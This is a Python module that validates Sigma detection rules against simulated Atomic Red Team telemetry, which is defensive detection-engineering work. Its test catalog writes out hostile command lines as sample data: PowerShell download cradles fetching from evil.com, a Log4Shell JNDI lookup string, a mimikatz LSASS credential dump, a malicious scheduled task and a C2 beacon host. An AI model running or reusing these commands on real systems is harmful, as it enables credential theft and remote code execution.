"""Atomic Red Team validation for Sigma detection rules.

Provides a framework for mapping Sigma rules to Atomic Red Team test cases
and validating that a detection would fire against known attack telemetry.

All functions are pure. Mock mode supplies deterministic test data for
offline CI pipelines.
"""

from __future__ import annotations

import logging
import re
from dataclasses import asdict, dataclass, field
from enum import StrEnum
from typing import Any

log = logging.getLogger(__name__)


class ValidationStatus(StrEnum):
    """Result of a detection validation."""

    PASS = "pass"
    FAIL = "fail"
    PARTIAL = "partial"
    SKIP = "skip"
    ERROR = "error"


@dataclass
class AtomicTest:
    """An Atomic Red Team test case mapped to a Sigma rule."""

    test_id: str
    technique_id: str
    name: str
    description: str
    # Simulated telemetry fields the test would generate
    simulated_events: list[dict[str, Any]] = field(default_factory=list)
    # Expected detection fields that should match
    expected_fields: dict[str, Any] = field(default_factory=dict)
    # Platforms this test runs on
    platforms: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


@dataclass
class ValidationResult:
    """Result of validating a Sigma rule against a telemetry sample."""

    status: ValidationStatus
    rule_title: str
    technique_id: str
    test_id: str
    matched_fields: list[str] = field(default_factory=list)
    missed_fields: list[str] = field(default_factory=list)
    details: str = ""

    def to_dict(self) -> dict[str, Any]:
        d = asdict(self)
        d["status"] = self.status.value
        return d


# ---------------------------------------------------------------------------
# Technique → Atomic test mapping (built-in catalog)
# ---------------------------------------------------------------------------

_TECHNIQUE_TESTS: dict[str, list[AtomicTest]] = {
    "T1059": [
        AtomicTest(
            test_id="T1059.001-01",
            technique_id="T1059",
            name="PowerShell Download Cradle",
            description="Execute a PowerShell command that downloads content from a URL.",
            simulated_events=[
                {
                    "EventID": 1,
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                }
            ],
            expected_fields={
                "Image|endswith": "\\powershell.exe",
                "CommandLine|contains": "DownloadString",
            },
            platforms=["windows"],
        ),
        AtomicTest(
            test_id="T1059.001-02",
            technique_id="T1059",
            name="PowerShell Encoded Command",
            description="Execute a base64-encoded PowerShell command.",
            simulated_events=[
                {
                    "EventID": 1,
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -enc JABjAD0ATgBlAHcALQBPAHIA",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                }
            ],
            expected_fields={
                "Image|endswith": "\\powershell.exe",
                "CommandLine|contains": "-enc",
            },
            platforms=["windows"],
        ),
    ],
    "T1003": [
        AtomicTest(
            test_id="T1003.001-01",
            technique_id="T1003",
            name="Mimikatz Credential Dump",
            description="Run mimikatz to dump LSASS credentials.",
            simulated_events=[
                {
                    "EventID": 1,
                    "Image": "C:\\Tools\\mimikatz.exe",
                    "CommandLine": "mimikatz.exe sekurlsa::logonpasswords",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
                {
                    "EventID": 10,
                    "SourceImage": "C:\\Tools\\mimikatz.exe",
                    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                },
            ],
            expected_fields={
                "Image|endswith": "\\mimikatz.exe",
                "CommandLine|contains": "sekurlsa",
            },
            platforms=["windows"],
        ),
    ],
    "T1053": [
        AtomicTest(
            test_id="T1053.005-01",
            technique_id="T1053",
            name="Scheduled Task Creation",
            description="Create a scheduled task that runs a malicious command.",
            simulated_events=[
                {
                    "EventID": 1,
                    "Image": "C:\\Windows\\System32\\schtasks.exe",
                    "CommandLine": 'schtasks /create /tn "EvilTask" /tr "cmd.exe /c whoami" /sc daily',
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
                {
                    "EventID": 4698,
                    "TaskName": "EvilTask",
                    "TaskContent": "cmd.exe /c whoami",
                },
            ],
            expected_fields={
                "Image|endswith": "\\schtasks.exe",
                "EventID": 4698,
            },
            platforms=["windows"],
        ),
    ],
    "T1190": [
        AtomicTest(
            test_id="T1190-01",
            technique_id="T1190",
            name="Exploit Public-Facing Application",
            description="Send a crafted HTTP request to a vulnerable web application.",
            simulated_events=[
                {
                    "c-uri": "/api/vulnerable?input=${jndi:ldap://evil.com/a}",
                    "sc-status": 200,
                    "src_ip": "192.168.1.100",
                }
            ],
            expected_fields={
                "c-uri|contains": "jndi",
            },
            platforms=["linux", "windows"],
        ),
    ],
    "T1566": [
        AtomicTest(
            test_id="T1566.001-01",
            technique_id="T1566",
            name="Phishing Attachment Execution",
            description="User opens a macro-enabled document that spawns PowerShell.",
            simulated_events=[
                {
                    "EventID": 1,
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -c Invoke-WebRequest http://evil.com/stage2",
                    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                }
            ],
            expected_fields={
                "ParentImage|endswith": "\\WINWORD.EXE",
                "Image|endswith": "\\powershell.exe",
            },
            platforms=["windows"],
        ),
    ],
    "T1071": [
        AtomicTest(
            test_id="T1071.001-01",
            technique_id="T1071",
            name="HTTP C2 Beaconing",
            description="Simulate a C2 beacon using HTTP POST to a non-browser process.",
            simulated_events=[
                {
                    "EventID": 3,
                    "Image": "C:\\Windows\\Temp\\beacon.exe",
                    "DestinationHostname": "evil-c2.com",
                    "DestinationPort": 443,
                    "Protocol": "tcp",
                }
            ],
            expected_fields={
                "DestinationPort": 443,
            },
            platforms=["windows"],
        ),
    ],
}


def validate_detection(
    sigma_yaml: str,
    telemetry: dict[str, Any] | None = None,
    *,
    mock: bool = False,
) -> ValidationResult:
    """Validate a Sigma rule against attack telemetry.

    Parses the Sigma YAML to extract logsource, detection conditions, and
    MITRE technique tags. Then matches against provided telemetry or
    simulated Atomic Red Team events.

    Args:
        sigma_yaml: The Sigma rule as a YAML string.
        telemetry: Optional dict of event fields to test against.
            If ``None``, uses simulated Atomic Red Team telemetry.
        mock: If True, returns a deterministic passing result for CI.

    Returns:
        ValidationResult indicating pass/fail/partial with details.
    """
    if mock:
        return _mock_validation_result(sigma_yaml)

    # Parse rule metadata
    rule_title = _extract_field(sigma_yaml, "title") or "Unknown Rule"
    technique_ids = _extract_technique_ids(sigma_yaml)
    technique_id = technique_ids[0] if technique_ids else "T0000"

    # Find matching Atomic tests
    tests = _find_atomic_tests(technique_id)
    if not tests:
        return ValidationResult(
            status=ValidationStatus.SKIP,
            rule_title=rule_title,
            technique_id=technique_id,
            test_id="none",
            details=f"No Atomic Red Team tests found for {technique_id}",
        )

    test = tests[0]

    # Use provided telemetry or simulated
    events = [telemetry] if telemetry else test.simulated_events

    # Extract detection conditions from the Sigma rule
    conditions = _extract_conditions(sigma_yaml)

    # Evaluate each event against the detection conditions
    matched_fields: list[str] = []
    missed_fields: list[str] = []

    for event in events:
        for field_name, expected_value in conditions.items():
            if _field_matches(event, field_name, expected_value):
                matched_fields.append(field_name)
            else:
                missed_fields.append(field_name)

    # Determine overall status
    total = len(matched_fields) + len(missed_fields)
    if total == 0:
        status = ValidationStatus.SKIP
        details = "No detection conditions to evaluate."
    elif len(missed_fields) == 0:
        status = ValidationStatus.PASS
        details = f"All {len(matched_fields)} conditions matched against test {test.test_id}."
    elif len(matched_fields) == 0:
        status = ValidationStatus.FAIL
        details = f"No conditions matched. Missed: {missed_fields}"
    else:
        status = ValidationStatus.PARTIAL
        details = (
            f"{len(matched_fields)}/{total} conditions matched. "
            f"Missed: {missed_fields}"
        )

    return ValidationResult(
        status=status,
        rule_title=rule_title,
        technique_id=technique_id,
        test_id=test.test_id,
        matched_fields=matched_fields,
        missed_fields=missed_fields,
        details=details,
    )


def get_atomic_tests(technique_id: str) -> list[AtomicTest]:
    """Retrieve Atomic Red Team test cases for a given technique.

    Args:
        technique_id: MITRE ATT&CK technique ID (e.g., "T1059").

    Returns:
        List of AtomicTest objects (empty if no tests found).
    """
    return _find_atomic_tests(technique_id)


def list_available_techniques() -> list[str]:
    """List all technique IDs with available Atomic test mappings.

    Returns:
        Sorted list of technique ID strings.
    """
    return sorted(_TECHNIQUE_TESTS.keys())


def get_mock_telemetry(technique_id: str) -> dict[str, Any] | None:
    """Return mock telemetry for a technique (first simulated event).

    Args:
        technique_id: MITRE ATT&CK technique ID.

    Returns:
        A dict of event fields, or None if no mock data exists.
    """
    tests = _find_atomic_tests(technique_id)
    if tests and tests[0].simulated_events:
        return tests[0].simulated_events[0]
    return None


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _find_atomic_tests(technique_id: str) -> list[AtomicTest]:
    """Look up Atomic tests by technique ID (exact or prefix match)."""
    # Exact match
    if technique_id in _TECHNIQUE_TESTS:
        return _TECHNIQUE_TESTS[technique_id]

    # Prefix match: T1059.001 → T1059
    base = technique_id.split(".")[0]
    if base in _TECHNIQUE_TESTS:
        return _TECHNIQUE_TESTS[base]

    return []


def _extract_field(yaml_str: str, field_name: str) -> str | None:
    """Extract a top-level YAML field value (simple regex, not a full parser)."""
    pattern = re.compile(rf"^{re.escape(field_name)}:\s*(.+)$", re.MULTILINE)
    match = pattern.search(yaml_str)
    return match.group(1).strip().strip('"').strip("'") if match else None


def _extract_technique_ids(yaml_str: str) -> list[str]:
    """Extract MITRE technique IDs from Sigma YAML tags."""
    technique_re = re.compile(r"attack\.(t\d{4}(?:\.\d{3})?)", re.IGNORECASE)
    return [m.upper() for m in technique_re.findall(yaml_str)]


def _extract_conditions(sigma_yaml: str) -> dict[str, Any]:
    """Extract field: value pairs from the Sigma detection block.

    Returns a dict of field_name → expected_value. Handles simple
    ``field: value`` and ``field|modifier: value`` patterns.
    """
    conditions: dict[str, Any] = {}

    # Find the detection: block
    detection_match = re.search(
        r"^detection:\s*\n(.*?)(?=\n\S|\Z)", sigma_yaml, re.MULTILINE | re.DOTALL
    )
    if not detection_match:
        return conditions

    detection_block = detection_match.group(1)

    # Extract field: value lines (skip selection/condition keywords)
    for line in detection_block.split("\n"):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if (line.startswith("condition:") or line.endswith(":")) and ":" in line and not line.startswith("-"):
            # This is a selection name or condition statement
            key, _, val = line.partition(":")
            key = key.strip()
            val = val.strip()
            if key == "condition" or not val:
                continue
                # Could be a list key like "EventID:"
                continue

        # Match indented field: value or field: [list]
        field_match = re.match(r"(\w[\w|]*?):\s*(.+)$", line)
        if field_match:
            key = field_match.group(1).strip()
            val = field_match.group(2).strip().strip("'\"")
            if key not in ("condition", "selection", "filter"):
                conditions[key] = val

    return conditions


def _field_matches(
    event: dict[str, Any], sigma_field: str, expected_value: Any
) -> bool:
    """Check if an event field matches a Sigma detection condition.

    Supports basic modifiers: |contains, |endswith, |startswith.
    """
    # Resolve the base field name
    base_field = sigma_field.split("|")[0]

    # Check if the event has the field
    event_value = None
    for key in event:
        if key.lower() == base_field.lower():
            event_value = event[key]
            break

    if event_value is None:
        return False

    event_str = str(event_value).lower()
    expected_str = str(expected_value).lower().strip("'\"")

    # Apply modifier
    if "|contains" in sigma_field:
        return expected_str in event_str
    if "|endswith" in sigma_field:
        return event_str.endswith(expected_str)
    if "|startswith" in sigma_field:
        return event_str.startswith(expected_str)

    # Exact match (case-insensitive)
    return event_str == expected_str


def _mock_validation_result(sigma_yaml: str) -> ValidationResult:
    """Return a deterministic passing result for mock/CI mode."""
    title = _extract_field(sigma_yaml, "title") or "Mock Rule"
    technique_ids = _extract_technique_ids(sigma_yaml)
    technique_id = technique_ids[0] if technique_ids else "T0000"

    return ValidationResult(
        status=ValidationStatus.PASS,
        rule_title=title,
        technique_id=technique_id,
        test_id=f"{technique_id}-MOCK-01",
        matched_fields=["CommandLine", "Image"],
        missed_fields=[],
        details="Mock validation — deterministic pass.",
    )
